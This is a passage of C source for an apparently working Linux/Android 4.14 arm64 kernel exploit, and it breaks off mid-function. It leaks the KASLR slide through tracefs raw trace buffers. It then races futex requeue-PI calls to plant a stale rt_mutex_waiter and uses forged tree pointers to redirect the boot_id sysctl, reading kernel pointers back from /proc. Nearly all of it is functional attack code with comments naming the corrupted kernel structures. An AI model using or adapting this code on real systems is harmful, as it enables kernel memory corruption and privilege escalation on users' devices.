#include "common.h"
#include "reclaim_capture_gate.h"
#include "slide_supervisor.h"

#define SLIDE_MAX_ATTEMPTS 1
#define SLIDE_SUPERVISOR_TIMEOUT_MS 12000
#define SLIDE_CONSUME_DELAY 2000
#define SLIDE_PSELECT_NFDS PSELECT_ROUTE_NFDS
#define SLIDE_WAIT_SECONDS 5
#define SLIDE_ROUTE_SETTLE_USEC 200000
#define SLIDE_ROUTE_DONE_TIMEOUT_MS 9000
#define SLIDE_ROUTE_POLL_USEC 1000
#define SLIDE_ROUTE_DEBUG_TAG "[DEBUG-slide-route]"

#define SLIDE_TRACEFS_ROOT "/sys/kernel/tracing"

#if TARGET_USE_PSELECT_RESULT_STAMP
static int slide_supervisor_pipe_relocate(int fds[2]) {
  int high_read = fcntl(
      fds[0], F_DUPFD_CLOEXEC, PSELECT_ROUTE_NFDS + 64);
  if (high_read < 0) {
    return 0;
  }
  int high_write = fcntl(fds[1], F_DUPFD_CLOEXEC, high_read + 1);
  if (high_write < 0) {
    int saved_errno = errno;
    close(high_read);
    errno = saved_errno;
    return 0;
  }
  close(fds[0]);
  close(fds[1]);
  fds[0] = high_read;
  fds[1] = high_write;
  return 1;
}
#endif

/* ------------------------------------------------------------------ */
/* Tracefs wchan slide leak (read-only, no kernel writes).             */
/* Enables sched/sched_blocked_reason, waits for a kworker to block on */
/* schedule() and decodes the recorded wchan return site.              */
/* ------------------------------------------------------------------ */

static int slide_tracefs_write(const char *path, const char *value) {
  int fd = open(path, O_WRONLY | O_CLOEXEC);
  if (fd < 0) {
    return 0;
  }
  size_t len = strlen(value);
  ssize_t wrote = write(fd, value, len);
  close(fd);
  return wrote == (ssize_t)len;
}

static int slide_tracefs_parse_page(
    const unsigned char *page, size_t page_len, uint64_t *out) {
  if (page_len < 20) {
    return 0;
  }

  uint64_t commit = 0;
  memcpy(&commit, page + 8, sizeof(commit));
  size_t data_len = (size_t)(commit & 0xfffULL);
  size_t end = 16 + data_len;
  if (end > page_len) {
    end = page_len;
  }

  for (size_t pos = 16; pos + 4 <= end;) {
    uint32_t event_header = 0;
    memcpy(&event_header, page + pos, sizeof(event_header));
    uint32_t type_len = event_header & 0x1fU;
    if (type_len == 30) {
      pos += 8;
      continue;
    }
    if (type_len == 31) {
      pos += 12;
      continue;
    }
    if (type_len == 0 || type_len >= 29) {
      break;
    }

    size_t record_len = (size_t)type_len * 4;
    size_t record = pos + 4;
    if (record + record_len > end) {
      break;
    }
    uint16_t event_id = 0;
    memcpy(&event_id, page + record, sizeof(event_id));
    if (event_id == SLIDE_TRACEFS_EVENT_ID && record_len >= 24) {
      uint64_t caller = 0;
      memcpy(&caller, page + record + 16, sizeof(caller));

      uint64_t link_caller =
          KIMAGE_TEXT_BASE + SLIDE_TRACEFS_WORKER_CALLER_OFF;
      if (caller >= link_caller) {
        uint64_t candidate = caller - link_caller;
        /* KASLR delta on arm64 4.14: < 128 GB and 2 MiB aligned. */
        if ((candidate >> 37) == 0 && (candidate & 0x1fffffULL) == 0) {
          *out = candidate;
          return 1;
        }
      }
    }
    pos = record + record_len;
  }
  return 0;
}

int slide_tracefs_leak_kernel_base(void) {
  static const char tracing_on[] =
      SLIDE_TRACEFS_ROOT "/tracing_on";
  static const char event_enable[] =
      SLIDE_TRACEFS_ROOT "/events/sched/sched_blocked_reason/enable";

  if (!slide_tracefs_write(event_enable, "1") ||
      !slide_tracefs_write(tracing_on, "1")) {
    pr_warning("slide tracefs setup failed errno=%d\n", errno);
    return 0;
  }

  int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
  uint64_t candidate = 0;
  int found = 0;
  /* Two sampling windows: kworkers block on schedule() constantly, so
   * even a few hundred milliseconds is plenty; poll per-CPU raw rings
   * non-blocking. */
  for (int round = 0; round < 10 && !found; round++) {
    usleep(300000);
    for (int cpu = 0; cpu < cpu_count && !found; cpu++) {
      char path[128];
      snprintf(path, sizeof(path),
               SLIDE_TRACEFS_ROOT "/per_cpu/cpu%d/trace_pipe_raw", cpu);
      int fd = open(path, O_RDONLY | O_NONBLOCK | O_CLOEXEC);
      if (fd < 0) {
        continue;
      }
      unsigned char page[4096];
      ssize_t got;
      while ((got = read(fd, page, sizeof(page))) > 0) {
        if (slide_tracefs_parse_page(page, (size_t)got, &candidate)) {
          found = 1;
          break;
        }
      }
      close(fd);
    }
  }
  slide_tracefs_write(tracing_on, "0");
  slide_tracefs_write(event_enable, "0");
  if (!found) {
    pr_warning("slide tracefs worker caller not found\n");
    return 0;
  }

  kaslr_base = KIMAGE_TEXT_BASE + candidate;
  kaslr_slide = candidate;
  pr_success("slide-kaslr-ok source=tracefs pid=%d base=%016llx "
             "slide=%016llx\n",
             getpid(), (unsigned long long)kaslr_base,
             (unsigned long long)kaslr_slide);
  return 1;
}

/* ------------------------------------------------------------------ */
/* Slide stage (CVE walk + boot_id read-back)                          */
/* ------------------------------------------------------------------ */

static uint32_t slide_f_wait;
static uint32_t slide_f_pi_target;
static uint32_t slide_f_pi_chain;
static atomic_int slide_waiter_ready;
static atomic_int slide_waiter_waiting;
static atomic_int slide_waiter_chain_locked;
static atomic_int slide_waiter_wait_returned;
static atomic_int slide_waiter_wait_ret;
static atomic_int slide_waiter_wait_errno;
static atomic_int slide_owner_started;
static atomic_int slide_owner_target_locked;
static atomic_int slide_owner_chain_entered;
static atomic_int slide_owner_chain_returned;
static atomic_int slide_owner_chain_ret;
static atomic_int slide_owner_chain_errno;
static atomic_int slide_route_done;
static atomic_int slide_waiter_tid;
static atomic_int slide_parent_requeue_ret;
static atomic_int slide_parent_requeue_errno;
static atomic_int slide_consume_calls;
static atomic_int slide_consume_go;
static atomic_int slide_consume_seen;
static atomic_int slide_consume_lost;
static atomic_int slide_consume_enter_sched;
static atomic_int slide_consume_stop;
static atomic_int slide_consume_sched_ok;
static atomic_int slide_consume_last_sched_ret;
static atomic_int slide_consume_last_sched_errno;
#if TARGET_USE_PSELECT_RESULT_STAMP
static struct pselect_waiter_stamp slide_pselect_waiter_stamp;
#else
static struct process_vm_waiter_stamp slide_waiter_stamp;
#endif
static atomic_int slide_waiter_stamp_ready;

int slide_pselect_words_per_set(void) {
  int bits_per_word = (int)(8 * sizeof(unsigned long));
  return (SLIDE_PSELECT_NFDS + bits_per_word - 1) / bits_per_word;
}

int slide_pselect_put_global_word(
    fd_set *in, fd_set *out, fd_set *ex, int words_per_set,
    int global_word, uint64_t value) {
  if (global_word < 0) {
    return 0;
  }

  int set_idx = global_word / words_per_set;
  int word_idx = global_word % words_per_set;
  switch (set_idx) {
    case 0:
      fdset_put_word(in, word_idx, value);
      return 1;
    case 1:
      fdset_put_word(out, word_idx, value);
      return 1;
    case 2:
      fdset_put_word(ex, word_idx, value);
      return 1;
    default:
      return 0;
  }
}

void slide_pselect_put_waiter_word(
    fd_set *in, fd_set *out, fd_set *ex, int words_per_set,
    int waiter_word, int shift, uint64_t value, const char *name) {
  int global_word = shift + waiter_word;
  int placed = slide_pselect_put_global_word(
      in, out, ex, words_per_set, global_word, value);
  if (!placed) {
    pr_warning("slide pselect cannot place %s waiter_word=%d global_word=%d "
               "words_per_set=%d nfds=%d\n",
               name, waiter_word, global_word, words_per_set,
               SLIDE_PSELECT_NFDS);
  }
}

void prepare_slide_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
  FD_ZERO(in);
  FD_ZERO(out);
  FD_ZERO(ex);

  int words_per_set = slide_pselect_words_per_set();
  int shift = PSELECT_WAITER_WORD_SHIFT;
  struct slide_waiter_word {
    int word;
    int shift;
    uint64_t value;
    const char *name;
  } words[] = {
    {0, shift, 0, "tree_pc"},
    {1, shift, 0, "tree_right"},
    {2, shift, 0, "tree_left"},
    {3, shift, 0, "pi_parent"},
    {4, shift, 0, "pi_right"},
    {5, shift, 0, "pi_left"},
    {6, shift, 0, "task"},
    {7, shift, fake_lock, "lock"},
    {8, shift, FAKE_WAITER_PRIO, "prio"},
    {9, shift, 0, "deadline"},
  };
  for (size_t i = 0; i < sizeof(words) / sizeof(words[0]); i++) {
    struct slide_waiter_word *w = &words[i];
    slide_pselect_put_waiter_word(
        in, out, ex, words_per_set, w->word, w->shift, w->value, w->name);
  }
}

void open_slide_selected_fds(fd_set *in, fd_set *out, fd_set *ex, int read_fd) {
  for (int fd = 0; fd < SLIDE_PSELECT_NFDS; fd++) {
    if (FD_ISSET(fd, in) || FD_ISSET(fd, out) || FD_ISSET(fd, ex)) {
      dup2(read_fd, fd);
    }
  }
  dup2(read_fd, SLIDE_PSELECT_NFDS - 1);
  FD_SET(SLIDE_PSELECT_NFDS - 1, ex);
}

static int slide_prepare_waiter_stamp(void) {
  if (!page_base || !fake_lock || !fake_w0) {
    pr_warning("slide process_vm missing kernel page base=%016zx lock=%016zx "
               "w0=%016zx\n",
               page_base, fake_lock, fake_w0);
    return 0;
  }

  atomic_store(&slide_consume_stop, 0);
  atomic_store(&slide_consume_go, 0);
  atomic_store(&slide_consume_seen, 0);
  atomic_store(&slide_consume_lost, 0);
  atomic_store(&slide_consume_enter_sched, 0);
  atomic_store(&slide_consume_calls, 0);
  atomic_store(&slide_consume_sched_ok, 0);
  atomic_store(&slide_consume_last_sched_ret, -1);
  atomic_store(&slide_consume_last_sched_errno, 0);

  /*
   * Stamp geometry (vendor 4.14 rt_mutex_waiter, 10 qwords):
   * q0 tree_entry parent, q1/q2 right/left, q3-q5 pi_tree_entry (dead:
   * the walk ends on lock->owner == NULL), q6 task, q7 lock, q8 prio,
   * q9 deadline.
   *
   * Spec A (mode 0): q0-q5 zero + task = fake_task.  parent 0 makes
   * rb_erase_cached take the no-parent case (root->rb_node := NULL,
   * on-page write, no fixup); task = fake_task makes the trailing
   * wake_up_process(top_waiter->task) a no-op (pi_lock zeroed, state 0).
   * No address outside the reclaimed page is ever dereferenced.
   *
   * Spec B (mode 1 linear / mode 2 virtual): q0/q2 carry the aliases of
   * &loggers[0][1] and &random_table[5].data so the erase's
   * one-left-child path repoints the boot_id sysctl .data at the loggers
   * slot (write #1) and parks the slot pointer in loggers[0][2]
   * (write #2).  task stays fake_task: SLIDE_INIT_TASK-style aliases are
   * never needed on 4.14 (the walk never reaches the pi-tree ops) and
   * are per-boot wrong on this kernel.
   */
  uint64_t parent_anchor = 0;
  uint64_t left_anchor = 0;
  if (p0_slide_leak == 1) {
    parent_anchor = SLIDE_LOGGERS_0_1;
    left_anchor = SLIDE_RANDOM_BOOT_ID_DATA;
  } else if (p0_slide_leak == 2) {
    parent_anchor = kaslr_image_addr(SLIDE_LOGGERS_0_1_IMAGE);
    left_anchor = kaslr_image_addr(SLIDE_RANDOM_BOOT_ID_DATA_IMAGE);
  }
  const uint64_t words[PROCESS_VM_WAITER_WORDS] = {
    parent_anchor,
    0,
    left_anchor,
    0,
    0,
    0,
    fake_task, fake_lock, FAKE_WAITER_PRIO, 0,
  };
#if TARGET_USE_PSELECT_RESULT_STAMP
  if (!pselect_prepare_waiter_stamp(&slide_pselect_waiter_stamp, words)) {
    pr_warning("slide pselect6 stamp prepare failed errno=%d\n", errno);
    return 0;
  }
#else
  process_vm_prepare_waiter_stamp(&slide_waiter_stamp, words);
#endif
  atomic_store(&slide_waiter_stamp_ready, 1);
#if TARGET_USE_PSELECT_RESULT_STAMP
  pr_info("slide pselect6 setup leak=%d delta=%016llx parent=%016llx "
          "left=%016llx page=%016zx fake_lock=%016zx fake_w0=%016zx "
          "fake_task=%016zx expected_ret=%d opened=%d\n",
          p0_slide_leak, (unsigned long long)p0_linear_delta,
          (unsigned long long)parent_anchor,
          (unsigned long long)left_anchor,
          page_base, fake_lock, fake_w0, fake_task,
          slide_pselect_waiter_stamp.expected_ret,
          slide_pselect_waiter_stamp.opened_fds);
#else
  pr_info("slide process_vm setup leak=%d delta=%016llx parent=%016llx "
          "left=%016llx page=%016zx fake_lock=%016zx fake_w0=%016zx "
          "fake_task=%016zx\n",
          p0_slide_leak, (unsigned long long)p0_linear_delta,
          (unsigned long long)parent_anchor,
          (unsigned long long)left_anchor,
          page_base, fake_lock, fake_w0, fake_task);
#endif
  return 1;
}

void slide_pselect_stack_copy(void) {
  if (!atomic_load(&slide_waiter_stamp_ready)) {
    return;
  }

  /*
   * This must be the first syscall after FUTEX_WAIT_REQUEUE_PI returns.
   * Retail .45.20 resets when the stale waiter is left exposed while the
   * old path initializes iovecs and logs.  All construction and logging are
   * completed before the waiter enters the futex syscall.
   */
#if TARGET_USE_PSELECT_RESULT_STAMP
  errno = 0;
  int ret = pselect_execute_waiter_stamp(&slide_pselect_waiter_stamp);
#else
  int ret = process_vm_execute_waiter_stamp(&slide_waiter_stamp);
#endif
  int saved_errno = errno;

  /* Keep this kernel stack untouched until the consumer performs the trigger. */
  atomic_store(&slide_consume_go, 1);
  while (atomic_load(&slide_consume_go) == 1) {
    __asm__ volatile("yield" ::: "memory");
  }

#if TARGET_USE_PSELECT_RESULT_STAMP
  int exact = pselect_waiter_stamp_matches(&slide_pselect_waiter_stamp);
  pr_info("slide pselect6 returned ret=%d expected=%d errno=%d exact=%d "
          "calls=%d sched_ok=%d last_sched_ret=%d last_sched_errno=%d\n",
          ret, slide_pselect_waiter_stamp.expected_ret, saved_errno, exact,
          atomic_load(&slide_consume_calls),
          atomic_load(&slide_consume_sched_ok),
          atomic_load(&slide_consume_last_sched_ret),
          atomic_load(&slide_consume_last_sched_errno));
  if (ret != slide_pselect_waiter_stamp.expected_ret || saved_errno != 0 ||
      !exact) {
    pr_warning("slide pselect6 stamp mismatch\n");
  }
#else
  pr_info("slide process_vm returned ret=%d errno=%d calls=%d sched_ok=%d "
          "last_sched_ret=%d last_sched_errno=%d\n",
          ret, saved_errno, atomic_load(&slide_consume_calls),
          atomic_load(&slide_consume_sched_ok),
          atomic_load(&slide_consume_last_sched_ret),
          atomic_load(&slide_consume_last_sched_errno));
  if (ret == -1 && saved_errno != EINVAL) {
    pr_warning("slide process_vm unexpected stamp errno=%d\n", saved_errno);
  }
#endif
}

void *slide_consumer_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();
  pin_to_core(CONSUMER_CORE);

  int seen = 0;
  for (;;) {
    int seq = atomic_load(&slide_consume_go);
    if (seq == 0 || seq == seen) {
      __asm__ volatile("yield" ::: "memory");
      if (atomic_load(&slide_consume_stop)) {
        return NULL;
      }
      continue;
    }

    seen = seq;
    atomic_store(&slide_consume_seen, seen);
    for (unsigned long spin = 0; spin < SLIDE_CONSUME_DELAY; spin++) {
      __asm__ volatile("yield" ::: "memory");
    }
    if (atomic_load(&slide_consume_go) != seq) {
      int lost = atomic_load(&slide_consume_lost) + 1;
      atomic_store(&slide_consume_lost, lost);
      continue;
    }

    int tid = atomic_load(&slide_waiter_tid);
    int calls = atomic_load(&slide_consume_calls);
    int entered = atomic_load(&slide_consume_enter_sched) + 1;
    atomic_store(&slide_consume_enter_sched, entered);
    atomic_store(&slide_consume_calls, calls + 1);
    errno = 0;
    /*
     * nice 19 makes the rewritten stale waiter lower priority than fake_w0.
     * That stops after the primary-tree erase (our intended write) and avoids
     * entering the fake task's secondary PI-tree adjustment path.
     */
    long ret = sched_setattr_tid(tid, PSELECT_CONSUMER_NICE);
    int saved_errno = errno;
    atomic_store(&slide_consume_last_sched_ret, (int)ret);
    atomic_store(&slide_consume_last_sched_errno, saved_errno);
    if (ret == 0) {
      int sched_ok = atomic_load(&slide_consume_sched_ok) + 1;
      atomic_store(&slide_consume_sched_ok, sched_ok);
    }
    atomic_store(&slide_consume_go, 0);
    atomic_store(&slide_consume_stop, 1);
    return NULL;
  }
}

void *slide_waiter_thread(void *arg __attribute__((unused))) {
  int tid = (int)SYSCHK(syscall(SYS_gettid));
  atomic_store(&slide_waiter_tid, tid);

  pr_info(SLIDE_ROUTE_DEBUG_TAG " waiter lock-chain enter tid=%d\n", tid);
  errno = 0;
  long chain_ret =
      futex_op(&slide_f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
  int chain_errno = errno;
  if (chain_ret != 0) {
    pr_error("slide waiter lock chain ret=%ld errno=%d\n",
             chain_ret, chain_errno);
    return NULL;
  }
  atomic_store(&slide_waiter_chain_locked, 1);
  pr_info(SLIDE_ROUTE_DEBUG_TAG
          " waiter lock-chain return tid=%d ret=%ld errno=%d\n",
          tid, chain_ret, chain_errno);

  atomic_store(&slide_waiter_ready, 1);
  while (!atomic_load(&slide_owner_started)) {
    usleep(1000);
  }

  struct timespec timeout;
  SYSCHK(clock_gettime(CLOCK_MONOTONIC, &timeout));
  timeout.tv_sec += SLIDE_WAIT_SECONDS;

  atomic_store(&slide_waiter_waiting, 1);
  pr_info(SLIDE_ROUTE_DEBUG_TAG
          " waiter wait-requeue enter tid=%d timeout=%ds\n",
          tid, SLIDE_WAIT_SECONDS);
  errno = 0;
  long wait_ret = futex_op(&slide_f_wait, FUTEX_WAIT_REQUEUE_PI, 0,
                           &timeout, &slide_f_pi_target, 0);
  int wait_errno = errno;

  /* No syscall, libc log, or iovec setup is permitted before this stamp. */
  slide_pselect_stack_copy();

  atomic_store(&slide_waiter_wait_ret, (int)wait_ret);
  atomic_store(&slide_waiter_wait_errno, wait_errno);
  atomic_store(&slide_waiter_wait_returned, 1);
  pr_info(SLIDE_ROUTE_DEBUG_TAG
          " waiter wait-requeue return tid=%d ret=%ld errno=%d\n",
          tid, wait_ret, wait_errno);

  /*
   * The boot_id write has completed.  Release the chain now so the owner can
   * leave LOCK_PI and the supervisor can reap this process group cleanly.
   */
  errno = 0;
  long unlock_ret =
      futex_op(&slide_f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
  int unlock_errno = errno;
  pr_info(SLIDE_ROUTE_DEBUG_TAG
          " waiter post-trigger unlock-chain tid=%d ret=%ld errno=%d\n",
          tid, unlock_ret, unlock_errno);
  if (unlock_ret != 0) {
    pr_warning(SLIDE_ROUTE_DEBUG_TAG
               " waiter post-trigger unlock-chain failed\n");
  } else {
    int owner_wait_ms = 0;
    while (!atomic_load(&slide_owner_chain_returned) && owner_wait_ms < 1000) {
      usleep(1000);
      owner_wait_ms++;
    }
    pr_info(SLIDE_ROUTE_DEBUG_TAG
            " waiter owner-chain-release observed=%d waited_ms=%d\n",
            atomic_load(&slide_owner_chain_returned), owner_wait_ms);
  }
  atomic_store(&slide_route_done, 1);

  for (;;) {
    sleep(1);
  }
}

void *slide_owner_thread(void *arg __attribute__((unused))) {
  pr_info(SLIDE_ROUTE_DEBUG_TAG " owner lock-target enter\n");
  errno = 0;
  long target_ret =
      futex_op(&slide_f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
  int target_errno = errno;
  if (target_ret != 0) {
    pr_error("slide owner lock target ret=%ld errno=%d\n",
             target_ret, target_errno);
    return NULL;
  }
  atomic_store(&slide_owner_target_locked, 1);
  pr_info(SLIDE_ROUTE_DEBUG_TAG
          " owner lock-target return ret=%ld errno=%d\n",
          target_ret, target_errno);

  while (!atomic_load(&slide_waiter_ready)) {
    usleep(1000);
  }

  atomic_store(&slide_owner_started, 1);
  atomic_store(&slide_owner_chain_entered, 1);
  pr_info(SLIDE_ROUTE_DEBUG_TAG " owner lock-chain enter\n");
  errno = 0;
  long chain_ret =
      futex_op(&slide_f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
  int chain_errno = errno;
  atomic_store(&slide_owner_chain_ret, (int)chain_ret);
  atomic_store(&slide_owner_chain_errno, chain_errno);
  atomic_store(&slide_owner_chain_returned, 1);
  pr_info(SLIDE_ROUTE_DEBUG_TAG
          " owner lock-chain return ret=%ld errno=%d\n",
          chain_ret, chain_errno);

  for (;;) {
    sleep(1);
  }
}

int hex_value(char c) {
  if (c >= '0' && c <= '9') {
    return c - '0';
  }
  if (c >= 'a' && c <= 'f') {
    return c - 'a' + 10;
  }
  if (c >= 'A' && c <= 'F') {
    return c - 'A' + 10;
  }
  return -1;
}

uint64_t slide_read_stext(void) {
  char buf[64];
  unsigned char raw[16];
  int fd = open("/proc/sys/kernel/random/boot_id", O_RDONLY | O_CLOEXEC);
  if (fd < 0) {
    pr_warning("slide boot_id read denied errno=%d\n", errno);
    return 0;
  }

  ssize_t n = read(fd, buf, sizeof(buf) - 1);
  int saved_errno = errno;
  close(fd);
  if (n < 0) {
    pr_warning("slide boot_id read failed errno=%d\n", saved_errno);
    return 0;
  }
  buf[n] = 0;

  int nibble = -1;
  int out = 0;
  for (ssize_t i = 0; i < n && out < 16; i++) {
    int v = hex_value(buf[i]);
    if (v < 0) {
      continue;
    }
    if (nibble < 0) {
      nibble = v;
      continue;
    }
    raw[out++] = (unsigned char)((nibble << 4) | v);
    nibble = -1;
  }
  if (out != 16) {
    pr_warning("slide short boot_id parse out=%d n=%zd\n", out, n);
    return 0;
  }

  uint64_t leaked = 0;
  uint64_t sidecar = 0;
  for (int i = 0; i < 8; i++) {
    leaked |= (uint64_t)raw[i] << (i * 8);
    sidecar |= (uint64_t)raw[8 + i] << (i * 8);
  }
  /*
   * Sidecar oracle: bytes 8..15 are the content of loggers[0][2], where
   * write #2 parked the boot_id slot alias.  A sane repoint leaves the
   * slot alias (in whatever address space mode 1/2 used) there; anything
   * else means the walk landed on a stale boot_id (mis-stamped or alias
   * delta wrong) - do not decode.
   */
  uint64_t expect_slot = p0_slide_leak == 2
      ? kaslr_image_addr(SLIDE_RANDOM_BOOT_ID_DATA_IMAGE)
      : (uint64_t)SLIDE_RANDOM_BOOT_ID_DATA;
  if (sidecar == expect_slot) {
    pr_success("slide boot_id_sidecar qword=%016llx slot_alias=%016llx "
               "(exact)\n",
               (unsigned long long)sidecar, (unsigned long long)expect_slot);
  } else if ((sidecar >> 48) == 0xffff) {
    pr_warning("slide boot_id_sidecar qword=%016llx slot_alias=%016llx "
               "(kernel-ish but mismatched)\n",
               (unsigned long long)sidecar, (unsigned long long)expect_slot);
  } else {
    pr_warning("slide boot_id_sidecar qword=%016llx (not a kernel pointer; "
               "repoint likely missed)\n",
               (unsigned long long)sidecar);
  }
  if ((leaked >> 48) != 0xffff) {
    pr_warning("slide bad leaked pointer=%016llx\n",
               (unsigned long long)leaked);
    return 0;
  }

  /*
   * leaked = runtime &nfulnl_logger = slid _text + its link-time image
   * offset.  Use the constant image offset (never the runtime alias):
   * the alias moves with the per-boot linear delta, the leaked pointer
   * does not.
   */
  uint64_t off = P0_NFULNL_LOGGER_IMAGE_OFF;
  uint64_t stext = leaked - off;
  pr_success("slide boot_id_leaked_nfulnl_logger pid=%d value=%016llx "
             "stext=%016llx\n",
             getpid(), (unsigned long long)leaked, (unsigned long long)stext);
  pr_success("slide boot_id-derived_stext pid=%d value=%016llx\n",
             getpid(), (unsigned long long)stext);
  return stext;
}
uint64_t slide_child_leak_stext(void) {
  pthread_t waiter;
  pthread_t owner;
  pthread_t consumer;
  atomic_store(&slide_waiter_ready, 0);
  atomic_store(&slide_waiter_waiting, 0);
  atomic_store(&slide_waiter_chain_locked, 0);
  atomic_store(&slide_waiter_wait_returned, 0);
  atomic_store(&slide_waiter_wait_ret, 0);
  atomic_store(&slide_waiter_wait_errno, 0);
  atomic_store(&slide_owner_started, 0);
  atomic_store(&slide_owner_target_locked, 0);
  atomic_store(&slide_owner_chain_entered, 0);
  atomic_store(&slide_owner_chain_returned, 0);
  atomic_store(&slide_owner_chain_ret, 0);
  atomic_store(&slide_owner_chain_errno, 0);
  atomic_store(&slide_route_done, 0);
  atomic_store(&slide_waiter_tid, 0);
  atomic_store(&slide_parent_requeue_ret, 0);
  atomic_store(&slide_parent_requeue_errno, 0);
  atomic_store(&slide_waiter_stamp_ready, 0);
  if (!slide_prepare_waiter_stamp()) {
    return 0;
  }
  int rc = pthread_create(&waiter, NULL, slide_waiter_thread, NULL);
  if (rc != 0) {
    errno = rc;
    pr_warning("slide waiter pthread_create failed errno=%d\n", rc);
    return 0;
  }
  rc = pthread_create(&owner, NULL, slide_owner_thread, NULL);
  if (rc != 0) {
    errno = rc;
    pr_warning("slide owner pthread_create failed errno=%d\n", rc);
    return 0;
  }
  rc = pthread_create(&consumer, NULL, slide_consumer_thread, NULL);
  if (rc != 0) {
    errno = rc;
    pr_warning("slide consumer pthread_create failed errno=%d\n", rc);
    return 0;
  }

  while (!atomic_load(&slide_waiter_waiting) ||
         !atomic_load(&slide_owner_started)) {
    usleep(1000);
  }

  pr_info(SLIDE_ROUTE_DEBUG_TAG
          " parent pre-settle waiter_tid=%d waiter_chain=%d "
          "waiter_waiting=%d owner_target=%d owner_chain_entered=%d\n",
          atomic_load(&slide_waiter_tid),
          atomic_load(&slide_waiter_chain_locked),
          atomic_load(&slide_waiter_waiting),
          atomic_load(&slide_owner_target_locked),
          atomic_load(&slide_owner_chain_entered));
  usleep(SLIDE_ROUTE_SETTLE_USEC);
  pr_info(SLIDE_ROUTE_DEBUG_TAG
          " parent cmp-requeue enter settle_us=%d owner_chain_returned=%d\n",
          SLIDE_ROUTE_SETTLE_USEC,
          atomic_load(&slide_owner_chain_returned));
  errno = 0;
  long requeue_ret = futex_op(&slide_f_wait, FUTEX_CMP_REQUEUE_PI, 1,
                              (void *)1, &slide_f_pi_target, 0);
  int requeue_errno = errno;
  atomic_store(&slide_parent_requeue_ret, (int)requeue_ret);
  atomic_store(&slide_parent_requeue_errno, requeue_errno);
  pr_info(SLIDE_ROUTE_DEBUG_TAG
          " parent cmp-requeue return ret=%ld errno=%d\n",
          requeue_ret, requeue_errno);

  int waited_ms = 0;
  while (!atomic_load(&slide_route_done) &&
         waited_ms < SLIDE_ROUTE_DONE_TIMEOUT_MS) {
    usleep(SLIDE_ROUTE_POLL_USEC);
    waited_ms += SLIDE_ROUTE_POLL_USEC / 1000;
  }
  if (!atomic_load(&slide_route_done)) {
    pr_warning(SLIDE_ROUTE_DEBUG_TAG
               " route timeout waited_ms=%d waiter_returned=%d "
               "wait_ret=%d wait_errno=%d owner_chain_returned=%d "
               "owner_chain_ret=%d owner_chain_errno=%d requeue_ret=%d "
               "requeue_errno=%d consume_seen=%d consume_calls=%d "
               "consume_enter_sched=%d consume_sched_ok=%d\n",
               waited_ms,
               atomic_load(&slide_waiter_wait_returned),
               atomic_load(&slide_waiter_wait_ret),
               atomic_load(&slide_waiter_wait_errno),
               atomic_load(&slide_owner_chain_returned),
               atomic_load(&slide_owner_chain_ret),
               atomic_load(&slide_owner_chain_errno),
               atomic_load(&slide_parent_requeue_ret),
               atomic_load(&slide_parent_requeue_errno),
               atomic_load(&slide_consume_seen),
               atomic_load(&slide_consume_calls),
               atomic_load(&slide_consume_enter_sched),
               atomic_load(&slide_consume_sched_ok));
    return 0;
  }

  pr_info(SLIDE_ROUTE_DEBUG_TAG
          " route done waited_ms=%d wait_ret=%d wait_errno=%d "
          "requeue_ret=%d requeue_errno=%d consume_calls=%d sched_ok=%d\n",
          waited_ms,
          atomic_load(&slide_waiter_wait_ret),
          atomic_load(&slide_waiter_wait_errno),
          atomic_load(&slide_parent_requeue_ret),
          atomic_load(&slide_parent_requeue_errno),
          atomic_load(&slide_consume_calls),
          atomic_load(&slide_consume_sched_ok));

  return slide_read_stext();
}

int slide_leak_kernel_base(void) {
  /*
   * Mode 2 bootstraps the slide with the read-only tracefs wchan leak,
   * then re-derives it through the CVE walk + boot_id redirect.  Success
   * requires both to agree: the walk writes through virtual kimg
   * addresses derived from the tracefs slide, so a match proves both
   * independently.
   */
  uint64_t tracefs_base = 0;
  if (p0_slide_leak == 2) {
    const char *env_base = getenv("AI_PIN_KASLR_BASE");
    if (env_base && *env_base) {
      errno = 0;
      char *end = NULL;
      unsigned long long v = strtoull(env_base, &end, 0);
      if (errno || end == env_base || (end && *end) ||
          (v & 0xfffULL)) {
        pr_warning("AI_PIN_KASLR_BASE parse failed: %s\n", env_base);
        return 0;
      }
      kaslr_base = (uint64_t)v;
      kaslr_slide = kaslr_base - KIMAGE_TEXT_BASE;
      pr_warning("kaslr base override from AI_PIN_KASLR_BASE "
                 "base=%016llx slide=%016llx\n",
                 (unsigned long long)kaslr_base,
                 (unsigned long long)kaslr_slide);
    } else if (!slide_tracefs_leak_kernel_base()) {
      return 0;
    }
    tracefs_base = kaslr_base;
  }

  for (int attempt = 1; attempt <= SLIDE_MAX_ATTEMPTS; attempt++) {
    page_base = prepare_good_kernel_page(PAGE_PAYLOAD_SLIDE);
    if (!page_base || !fake_lock) {
      continue;
    }

    if (ghostlock_capture_gate_enabled()) {
      pr_success("reclaim capture gate waiting token=%s base=%016zx "
                 "trigger=disabled\n",
                 ghostlock_capture_gate_token(), page_base);
      if (!ghostlock_capture_gate_wait(page_base)) {
        pr_warning("reclaim capture gate blocked trigger base=%016zx errno=%d\n",
                   page_base, errno);
        prepare_reclaim_trace_close();
        close_reclaim_sockets();
        cleanup_page_prepare_state();
        page_base = 0;
        fake_lock = 0;
        fake_w0 = 0;
        fake_task = 0;
        return 0;
      }
      prepare_reclaim_trace_close();
      pr_success("reclaim capture gate released base=%016zx trigger=enabled\n",
                 page_base);
    }

#if TARGET_USE_PSELECT_RESULT_STAMP
    pr_info("slide attempt %d uses native pselect6 result waiter stamp\n",
            attempt);
#else
    pr_info("slide attempt %d uses native process_vm waiter stamp\n", attempt);
#endif

    int fds[2];
    if (slide_supervisor_pipe(fds) != 0) {
      pr_warning("slide supervisor pipe failed errno=%d\n", errno);
      return 0;
    }
#if TARGET_USE_PSELECT_RESULT_STAMP
    if (!slide_supervisor_pipe_relocate(fds)) {
      int saved_errno = errno;
      close(fds[0]);
      close(fds[1]);
      errno = saved_errno;
      pr_warning("slide supervisor pipe relocate failed errno=%d\n", errno);
      return 0;
    }
#endif

    pid_t child = fork();
    if (child < 0) {
      int saved_errno = errno;
      close(fds[0]);
      close(fds[1]);
      errno = saved_errno;
      pr_warning("slide supervisor fork failed errno=%d\n", errno);
      return 0;
